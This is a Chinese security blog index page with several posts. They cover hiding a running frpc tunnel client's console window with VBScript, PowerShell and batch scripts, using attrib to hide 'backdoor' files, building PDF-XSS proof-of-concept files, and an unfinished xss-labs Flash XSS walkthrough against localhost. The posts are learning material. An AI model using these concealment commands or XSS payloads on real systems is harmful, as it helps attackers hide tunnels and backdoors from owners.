<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>thedarknessdied</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="记录美好的生活">
<meta property="og:type" content="website">
<meta property="og:title" content="thedarknessdied">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="thedarknessdied">
<meta property="og:description" content="记录美好的生活">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="R0seK1llere">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="thedarknessdied" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<meta name="generator" content="Hexo 7.1.1"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">thedarknessdied</a>
      </h1>
      
        <h2 id="subtitle-wrap">
          <a href="/" id="subtitle">R0seK1ller</a>
        </h2>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-tools-CMD-hidden-cmdline" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/03/25/tools-CMD-hidden-cmdline/" class="article-date">
  <time class="dt-published" datetime="2024-03-25T06:52:31.000Z" itemprop="datePublished">2024-03-25</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/03/25/tools-CMD-hidden-cmdline/">tools-CMD-hidden-cmdline</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="隐藏命令行黑框"><a href="#隐藏命令行黑框" class="headerlink" title="隐藏命令行黑框"></a>隐藏命令行黑框</h1><p>​	在windows环境下frp运行时，总会弹出一个黑框框，很容易被人识别，在不改动源码或者重新编译的情况下，可以通过下面的方法让黑框隐藏</p>
<h2 id="1-基于-Wscript-Shell-的隐藏命令行黑框方法"><a href="#1-基于-Wscript-Shell-的隐藏命令行黑框方法" class="headerlink" title="1. 基于 Wscript.Shell 的隐藏命令行黑框方法"></a>1. 基于 Wscript.Shell 的隐藏命令行黑框方法</h2><h3 id="1-1-使用-vbscript-脚本"><a href="#1-1-使用-vbscript-脚本" class="headerlink" title="1.1 使用 vbscript 脚本"></a>1.1 使用 vbscript 脚本</h3><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Set</span> objShell = WScript.<span class="built_in">CreateObject</span>(<span class="string">&quot;WScript.Shell&quot;</span>)</span><br><span class="line">objShell.Run <span class="string">&quot;cmd.exe /C frpc.exe -c frpc.ini&quot;</span>, <span class="number">0</span>, <span class="literal">False</span></span><br><span class="line">objShell.Run <span class="string">&quot;cmd.exe /C attrib +s +h +r /s /d *&quot;</span>, <span class="number">0</span>, <span class="literal">False</span></span><br><span class="line">WScript.Quit</span><br></pre></td></tr></table></figure>



<p><img src="/images/image-20240325141016145.png" alt="image-20240325141016145"></p>
<h3 id="1-2-使用-powershell-脚本"><a href="#1-2-使用-powershell-脚本" class="headerlink" title="1.2 使用 powershell 脚本"></a>1.2 使用 powershell 脚本</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$shell</span> = <span class="built_in">New-Object</span> <span class="literal">-ComObject</span> WScript.Shell</span><br><span class="line"><span class="variable">$shell</span>.Run(<span class="string">&quot;frpc.exe -c frpc.ini&quot;</span>, <span class="number">0</span>)</span><br><span class="line"><span class="variable">$shell</span>.Run(<span class="string">&quot;attrib +s +h +r /s /d *&quot;</span>, <span class="number">0</span>)</span><br><span class="line"><span class="keyword">Exit</span></span><br></pre></td></tr></table></figure>



<p><img src="/images/image-20240325142222704.png" alt="image-20240325142222704"></p>
<h3 id="1-3-使用批处理脚本"><a href="#1-3-使用批处理脚本" class="headerlink" title="1.3 使用批处理脚本"></a>1.3 使用批处理脚本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">if &quot;%1&quot; == &quot;h&quot; goto begin</span><br><span class="line">mshta vbscript:createobject(&quot;wscript.shell&quot;).run(&quot;&quot;&quot;%~nx0&quot;&quot; h&quot;,0)(window.close)&amp;&amp;exit</span><br><span class="line"></span><br><span class="line">:begin</span><br><span class="line">attrib +s +h +r /d /s *</span><br><span class="line">REM</span><br><span class="line">.\frpc.exe -c .\frpc.ini</span><br></pre></td></tr></table></figure>



<h2 id="2-基于-Start-Process-的隐藏命令行黑框方法"><a href="#2-基于-Start-Process-的隐藏命令行黑框方法" class="headerlink" title="2. 基于 Start-Process 的隐藏命令行黑框方法"></a>2. 基于 Start-Process 的隐藏命令行黑框方法</h2><h3 id="2-1-使用-powershell-脚本"><a href="#2-1-使用-powershell-脚本" class="headerlink" title="2.1 使用 powershell 脚本"></a>2.1 使用 powershell 脚本</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">programPath = <span class="string">&quot;frpc.exe&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$programArgs</span> = <span class="string">&quot;-c frpc.ini&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$processArgs</span> = <span class="selector-tag">@</span>&#123;</span><br><span class="line">    FilePath = <span class="variable">$programPath</span></span><br><span class="line">    ArgumentList = <span class="variable">$programArgs</span></span><br><span class="line">    WindowStyle = <span class="string">&#x27;Hidden&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Start-Process</span> @processArgs</span><br><span class="line"></span><br><span class="line"><span class="variable">$hiddenProgram</span> = <span class="string">&quot;attrib.exe&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$hiddenArgs</span> = <span class="string">&quot;+s +r +h *&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$hiddenprocessArgs</span> = <span class="selector-tag">@</span>&#123;</span><br><span class="line">    FilePath = <span class="variable">$hiddenProgram</span></span><br><span class="line">    ArgumentList = <span class="variable">$hiddenArgs</span></span><br><span class="line">    WindowStyle = <span class="string">&#x27;Hidden&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Start-Process</span> @hiddenprocessArgs</span><br></pre></td></tr></table></figure>



<p><img src="/images/image-20240325143352718.png" alt="image-20240325143352718"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/03/25/tools-CMD-hidden-cmdline/" data-id="clu6lf1gv0009a2vdhtpthmjh" data-title="tools-CMD-hidden-cmdline" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/tools/" rel="tag">tools</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-tools-CMD-attrib" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/03/25/tools-CMD-attrib/" class="article-date">
  <time class="dt-published" datetime="2024-03-25T06:51:42.000Z" itemprop="datePublished">2024-03-25</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/03/25/tools-CMD-attrib/">tools-CMD-attrib</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="批处理命令attrib"><a href="#批处理命令attrib" class="headerlink" title="批处理命令attrib"></a>批处理命令attrib</h1><h2 id="0-概念"><a href="#0-概念" class="headerlink" title="0. 概念"></a>0. 概念</h2><p>​	attrib是attribute的缩写，显示或更改文件（夹）属性的意思，是一个外部命令</p>
<h2 id="1-帮助文档"><a href="#1-帮助文档" class="headerlink" title="1. 帮助文档"></a>1. 帮助文档</h2><blockquote>
<p>ATTRIB [+R | -R] [+A | -A] [+S | -S] [+H | -H] [+O | -O] [+I | -I] [+X | -X] [+P | -P] [+U | -U]<br>[drive:][path][filename] [&#x2F;S [&#x2F;D]] [&#x2F;L]</p>
</blockquote>
<h3 id="1-1-属性修改"><a href="#1-1-属性修改" class="headerlink" title="1.1 属性修改"></a>1.1 属性修改</h3><table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>+</td>
<td>设置属性</td>
</tr>
<tr>
<td>-</td>
<td>清楚属性</td>
</tr>
</tbody></table>
<h3 id="1-2-属性类别"><a href="#1-2-属性类别" class="headerlink" title="1.2 属性类别"></a>1.2 属性类别</h3><table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>R</td>
<td>只读文档属性</td>
</tr>
<tr>
<td>A</td>
<td>存档文档属性</td>
</tr>
<tr>
<td>S</td>
<td>系统文件属性</td>
</tr>
<tr>
<td>H</td>
<td>隐藏文件属性</td>
</tr>
<tr>
<td>O</td>
<td>脱机属性</td>
</tr>
<tr>
<td>I</td>
<td>无内容索引文件属性</td>
</tr>
<tr>
<td>X</td>
<td>无清理文件属性</td>
</tr>
<tr>
<td>V</td>
<td>完整性属性</td>
</tr>
<tr>
<td>P</td>
<td>固定属性</td>
</tr>
<tr>
<td>U</td>
<td>非固定属性</td>
</tr>
</tbody></table>
<h4 id="1-2-1-存档属性"><a href="#1-2-1-存档属性" class="headerlink" title="1.2.1 存档属性"></a>1.2.1 存档属性</h4><p>​	“存档”属性是用于指示文件是否已被修改或需要进行备份的标志。当文件被修改后，”存档”属性会自动设置为”已修改”状态，表示文件需要进行备份。备份工具通常会根据文件的”存档”属性来确定哪些文件需要备份。</p>
<h4 id="1-2-2-系统属性"><a href="#1-2-2-系统属性" class="headerlink" title="1.2.2 系统属性"></a>1.2.2 系统属性</h4><p>​	“系统”属性用于标识文件为操作系统的核心文件或系统文件。设置了”系统”属性的文件通常具有特殊的权限和保护级别，防止用户对其进行意外或恶意的更改或删除。</p>
<h4 id="1-2-3-脱机属性"><a href="#1-2-3-脱机属性" class="headerlink" title="1.2.3 脱机属性"></a>1.2.3 脱机属性</h4><p>​	“脱机”属性用于指示文件是否处于脱机状态，即文件不需要与远程服务器保持同步。文件的”脱机”属性通常与网络文件共享和同步功能一起使用。当文件被标记为”脱机”属性时，表示该文件是网络文件，并且可以在离线状态下访问。这意味着文件可以从远程服务器下载到本地计算机，并在没有网络连接的情况下进行访问和修改。当重新连接到网络时，更改的文件可以与远程服务器同步。</p>
<h4 id="1-2-4-无内容索引文件属性"><a href="#1-2-4-无内容索引文件属性" class="headerlink" title="1.2.4 无内容索引文件属性"></a>1.2.4 无内容索引文件属性</h4><p>​	“无内容索引”（Sparse）文件属性是一种用于指示文件使用了稀疏文件分配技术的属性。稀疏文件是一种优化技术，用于在文件系统中节省存储空间，特别适用于处理大型文件中的稀疏数据。当文件被标记为”无内容索引”属性时，文件系统会将文件中的连续空白数据块标记为稀疏块，而不会实际分配磁盘空间来存储这些空白数据块。这样可以有效地减少文件的物理大小，节省存储空间。</p>
<h4 id="1-2-5-无清理文件属性"><a href="#1-2-5-无清理文件属性" class="headerlink" title="1.2.5 无清理文件属性"></a>1.2.5 无清理文件属性</h4><p>​	“无清理文件”属性用于指示文件不应该在进行磁盘清理或优化操作时被清理或处理。通常，磁盘清理工具会扫描磁盘上的文件，并根据一些规则来删除或优化不再需要的文件。但是，如果文件具有”无清理文件”属性，清理工具会跳过对该文件的处理，保留文件不受影响。</p>
<h4 id="1-2-6-完整性属性"><a href="#1-2-6-完整性属性" class="headerlink" title="1.2.6 完整性属性"></a>1.2.6 完整性属性</h4><p>​	文件完整性是一种安全功能，用于确保文件在存储和传输过程中的完整性。通过启用文件完整性功能，可以在文件或目录上设置一个完整性级别，以保护其内容不被未经授权的修改、篡改或破坏。</p>
<h3 id="1-3-其他"><a href="#1-3-其他" class="headerlink" title="1.3 其他"></a>1.3 其他</h3><table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>&#x2F;S</td>
<td>处理当前文件夹及其所有子文件夹中的匹配文件</td>
</tr>
<tr>
<td>&#x2F;D</td>
<td>以同样的方式处理文件夹</td>
</tr>
<tr>
<td>&#x2F;L</td>
<td>处理符号链接和符号链接目标的属性</td>
</tr>
</tbody></table>
<h2 id="2-隐藏后门文件"><a href="#2-隐藏后门文件" class="headerlink" title="2. 隐藏后门文件"></a>2. 隐藏后门文件</h2><blockquote>
<p>attrib +s +h +r &#x2F;d &#x2F;s *</p>
</blockquote>
<p>​	处理当前文件夹及所有子文件夹中文件和文件夹，使得其只读、隐藏、以系统权限运行</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/03/25/tools-CMD-attrib/" data-id="clu6lf1gu0007a2vd2yj59xjb" data-title="tools-CMD-attrib" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/tools/" rel="tag">tools</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-web-XSS-FlashXss-xss-PDF" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/03/25/web-XSS-FlashXss-xss-PDF/" class="article-date">
  <time class="dt-published" datetime="2024-03-25T04:35:55.000Z" itemprop="datePublished">2024-03-25</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/03/25/web-XSS-FlashXss-xss-PDF/">web-XSS-FlashXss-xss-PDF</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="PDF-XSS"><a href="#PDF-XSS" class="headerlink" title="PDF-XSS"></a>PDF-XSS</h1><h2 id="0-原理"><a href="#0-原理" class="headerlink" title="0. 原理"></a>0. 原理</h2><p>​	PDF-XSS(Portable Document Format Cross-Site Scripting)是一种利用PDF文件中的漏洞实现的跨站点脚本攻击。PDF文件是一种常见的电子文档格式，其中包含了丰富的内容，包括图像、文本、链接等等。攻击者可以通过在PDF文件中插入恶意代码，例如JavaScript脚本，来实现PDF XSS攻击。PDF XSS攻击可以在用户打开PDF文件时触发，当用户点击恶意链接或执行特定操作时，恶意代码就会被执行。攻击者可以利用PDF XSS攻击来窃取用户敏感信息、篡改网站内容、实施网络钓鱼。</p>
<h2 id="1-漏洞利用"><a href="#1-漏洞利用" class="headerlink" title="1. 漏洞利用"></a>1. 漏洞利用</h2><p>​	找到一处可以上传pdf文件的上传点，然后我们上传一个精心构造的pdf文件。如果网站允许我们在浏览器中访问pdf，那么该pdf文件就会弹出警告框。	</p>
<h2 id="2-利用方式"><a href="#2-利用方式" class="headerlink" title="2. 利用方式"></a>2. 利用方式</h2><h3 id="2-1-PDF-编辑器"><a href="#2-1-PDF-编辑器" class="headerlink" title="2.1 PDF 编辑器"></a>2.1 PDF 编辑器</h3><p>​	</p>
<p><img src="/images/image-20240322151303122.png" alt="image-20240322151303122"></p>
<p>​	在页面的属性里面新增<code>动作</code>选择<code>运行 JavaScript</code>然后插入 JS 即可：</p>
<p><img src="/images/image-20240322151701751.png" alt="image-20240322151701751"></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">alert</span>(<span class="string">&quot;1&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20240322151927872.png" alt="image-20240322151927872"></p>
<h4 id="2-1-1-以本地文件的形式访问"><a href="#2-1-1-以本地文件的形式访问" class="headerlink" title="2.1.1 以本地文件的形式访问"></a>2.1.1 以本地文件的形式访问</h4><p>​	在本地访问文件，成功弹窗</p>
<p><img src="/images/image-20240322151910170.png" alt="image-20240322151910170"></p>
<h4 id="2-1-2-以文件内嵌的形式访问"><a href="#2-1-2-以文件内嵌的形式访问" class="headerlink" title="2.1.2 以文件内嵌的形式访问"></a>2.1.2 以文件内嵌的形式访问</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">&quot;test.pdf&quot;</span> <span class="attr">width</span>=<span class="string">&quot;100%&quot;</span> <span class="attr">heigh</span>=<span class="string">&quot;100%&quot;</span> <span class="attr">type</span>=<span class="string">&quot;Application/pdf&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="2-2-Python-PyPDF2"><a href="#2-2-Python-PyPDF2" class="headerlink" title="2.2 Python PyPDF2"></a>2.2 Python PyPDF2</h3><h4 id="2-2-1-安装PyPDF2"><a href="#2-2-1-安装PyPDF2" class="headerlink" title="2.2.1 安装PyPDF2"></a>2.2.1 安装PyPDF2</h4><blockquote>
<p>pip install PyPDF2</p>
</blockquote>
<h4 id="2-2-2-编写一个带有XSS漏洞的空白PDF"><a href="#2-2-2-编写一个带有XSS漏洞的空白PDF" class="headerlink" title="2.2.2 编写一个带有XSS漏洞的空白PDF"></a>2.2.2 编写一个带有XSS漏洞的空白PDF</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PyPDF2 <span class="keyword">import</span> PdfReader, PdfWriter</span><br><span class="line"></span><br><span class="line">output_pdf = PdfWriter()</span><br><span class="line">page = output_pdf.add_blank_page(width=<span class="number">72</span>, height=<span class="number">72</span>)</span><br><span class="line">output_pdf.add_js(<span class="string">&quot;app.alert(&#x27;xss&#x27;);&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;xss.pdf&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    output_pdf.write(f)</span><br></pre></td></tr></table></figure>



<h2 id="3-PDF-javascript-参考手册"><a href="#3-PDF-javascript-参考手册" class="headerlink" title="3. PDF-javascript 参考手册"></a>3. PDF-javascript 参考手册</h2><ul>
<li><p>Adobe Acrobat 官方文档和开发人员资源：</p>
<ul>
<li>链接：<a target="_blank" rel="noopener" href="https://www.adobe.com/devnet/acrobat.html">https://www.adobe.com/devnet/acrobat.html</a></li>
<li>链接：<a target="_blank" rel="noopener" href="https://opensource.adobe.com/dc-acrobat-sdk-docs/library/jsapiref/index.html">https://opensource.adobe.com/dc-acrobat-sdk-docs/library/jsapiref/index.html</a></li>
</ul>
</li>
<li><p>Adobe Acrobat JavaScript Scripting Guide（适用于 Acrobat DC）：</p>
<ul>
<li>链接：<a target="_blank" rel="noopener" href="https://www.adobe.com/content/dam/acom/en/devnet/acrobat/pdfs/js_api_reference.pdf">https://www.adobe.com/content/dam/acom/en/devnet/acrobat/pdfs/js_api_reference.pdf</a></li>
</ul>
</li>
<li><p>Adobe Acrobat DC JavaScript API 参考：</p>
<ul>
<li>链接：<a target="_blank" rel="noopener" href="https://www.adobe.com/content/dam/acom/en/devnet/acrobat/pdfs/js_api_reference.pdf">https://www.adobe.com/content/dam/acom/en/devnet/acrobat/pdfs/js_api_reference.pdf</a></li>
</ul>
</li>
<li><p>Adobe Acrobat 2020&#x2F;2017&#x2F;2015&#x2F;DC（Classic）的 JavaScript API 参考：</p>
<ul>
<li>链接：<a target="_blank" rel="noopener" href="https://www.adobe.com/content/dam/acom/en/devnet/acrobat/pdfs/js_api_reference.pdf">https://www.adobe.com/content/dam/acom/en/devnet/acrobat/pdfs/js_api_reference.pdf</a></li>
</ul>
</li>
</ul>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/03/25/web-XSS-FlashXss-xss-PDF/" data-id="clu6lf1hm000ua2vdht5m9arl" data-title="web-XSS-FlashXss-xss-PDF" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-web-XSS-FlashXss-xss-labs20" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/03/22/web-XSS-FlashXss-xss-labs20/" class="article-date">
  <time class="dt-published" datetime="2024-03-22T06:04:38.000Z" itemprop="datePublished">2024-03-22</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/03/22/web-XSS-FlashXss-xss-labs20/">web-XSS-FlashXss-xss-labs20</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>[toc]</p>
<h1 id="Flash-poc"><a href="#Flash-poc" class="headerlink" title="Flash-poc"></a>Flash-poc</h1><h2 id="0-靶场环境"><a href="#0-靶场环境" class="headerlink" title="0. 靶场环境"></a>0. 靶场环境</h2><pre><code>访问靶场: http://localhost:8080/xss/level20.php?arg01=a&amp;arg02=b
</code></pre>
<p><img src="/images/image-20240322112000750.png" alt="image-20240322112000750"></p>
<h2 id="1-后端代码审计"><a href="#1-后端代码审计" class="headerlink" title="1. 后端代码审计"></a>1. 后端代码审计</h2><p><img src="/images/image-20240322112126316.png" alt="image-20240322112126316"></p>
<p>​	可以发现URL通过GET请求传入的参数arg01和arg02分别被作为xsf04.swf调用的键和值，访问<code>http://127.0.0.1:8080/xss/level20.php?arg01=a&amp;arg02=b</code>验证，打开控制台，查看内容发现没有突破点</p>
<p>​	当前页面也不存在报错，所以我们只能直接对xsf04.swf进行调试了</p>
<h2 id="2-flash-反编译"><a href="#2-flash-反编译" class="headerlink" title="2. flash 反编译"></a>2. flash 反编译</h2><p>​	使用 [jpexs-decompiler][<a target="_blank" rel="noopener" href="https://github.com/jindrapetrik/jpexs-decompiler]">https://github.com/jindrapetrik/jpexs-decompiler]</a> 工具反编译xsf04.swf</p>
<p><img src="/images/image-20240322112556405.png" alt="image-20240322112556405"></p>
<h3 id="2-1-参数传递分析"><a href="#2-1-参数传递分析" class="headerlink" title="2.1 参数传递分析"></a>2.1 参数传递分析</h3><p>​	通过 <code>this.root.loaderInfo.parameters</code> 来访问加载的SWF文件的参数（parameters）。</p>
<h4 id="2-1-1-loaderInfo"><a href="#2-1-1-loaderInfo" class="headerlink" title="2.1.1 loaderInfo"></a>2.1.1 loaderInfo</h4><p>​	<code>loaderInfo</code> 是Flash中的一个属性，它提供了有关加载的SWF文件的信息和属性。<code>parameters</code> 属性是 <code>loaderInfo</code> 对象的一个属性，它包含了加载的SWF文件所传递的参数信息。通过访问 <code>this.root.loaderInfo.parameters</code>，可以获取到传递给SWF文件的参数信息，这些参数通常是作为URL查询字符串的一部分传递给SWF文件的</p>
<p><img src="/images/image-20240322125529724.png" alt="image-20240322125529724"></p>
<p>​	通过上述代码可以发现我们需要对文件传入至少三个参数：<code>id</code>、<code>width</code>、<code>height</code></p>
<h3 id="2-1-2-ExternalInterface-call"><a href="#2-1-2-ExternalInterface-call" class="headerlink" title="2.1.2   ExternalInterface**.**call"></a>2.1.2   ExternalInterface**.**call</h3><p>​	后续代码上多次使用<code>button.addEventListener</code>绑定事件，并通过<code>ExternalInterface.call</code>实现具体实践效果</p>
<p><img src="/images/image-20240322130836129.png" alt="image-20240322130836129"></p>
<h3 id="2-2-ExternalInterface"><a href="#2-2-ExternalInterface" class="headerlink" title="2.2  ExternalInterface"></a>2.2  ExternalInterface</h3><p>​	ExternalInterface.call同样是一个Flash提供的可以执行js的接口函数， ExternalInterface.call函数有两个参数，形如ExternalInterface.call(“function_name”,”params”)</p>
<p>​	在编译过程中会将ExternalInterface.call编译为以下形式的内容</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">	<span class="title function_">__Flash__toXML</span>(函数名(<span class="string">&quot;参数1&quot;</span>)) ; </span><br><span class="line">&#125; <span class="keyword">catch</span> (e) &#123; </span><br><span class="line">    <span class="variable constant_">JS</span>行为</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	假设我们访问<code>http://localhost:8080/xss/level20.php?arg01=id&amp;arg02=test</code>执行，那么将会编译为</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">	<span class="title function_">__Flash__toXML</span>(<span class="title function_">load</span>(<span class="string">&quot;test&quot;</span>)) ; </span><br><span class="line">&#125; <span class="keyword">catch</span> (e) &#123; </span><br><span class="line">    <span class="variable constant_">JS</span>行为</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	因为能够让我们执行JS的位置位于catch捕获错误的语句块中，所以我们需要构造类似SQL注入一样的闭合payload，尝试访问:</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://localhost:8080/xss/level20.php?arg01=id&arg02=test%22));%7Dcatch(e)%7Balert(1)%7D//">http://localhost:8080/xss/level20.php?arg01=id&amp;arg02=test&quot;));}catch(e){alert(1)}//</a></p>
</blockquote>
<p>​	可以很显而易见的，代码已经向我们预期拼接了，下面去靶场上访问一下</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">x <span class="keyword">try</span>&#123;   </span><br><span class="line">    <span class="title function_">__Flash__toXML</span>(<span class="title function_">load</span>(<span class="string">&quot;test&quot;</span>));</span><br><span class="line">&#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//&quot;)) ; </span></span><br><span class="line">&#125; <span class="keyword">catch</span> (e) &#123;     </span><br><span class="line">    <span class="variable constant_">JS</span>行为</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	但是很遗憾，没有任何反应，这是为什么呢？</p>
<p><img src="/images/image-20240322134458424.png" alt="image-20240322134458424"></p>
<h3 id="2-3-转义突破"><a href="#2-3-转义突破" class="headerlink" title="2.3 转义突破"></a>2.3 转义突破</h3><p>​	在后端处理代码中有这么一段内容</p>
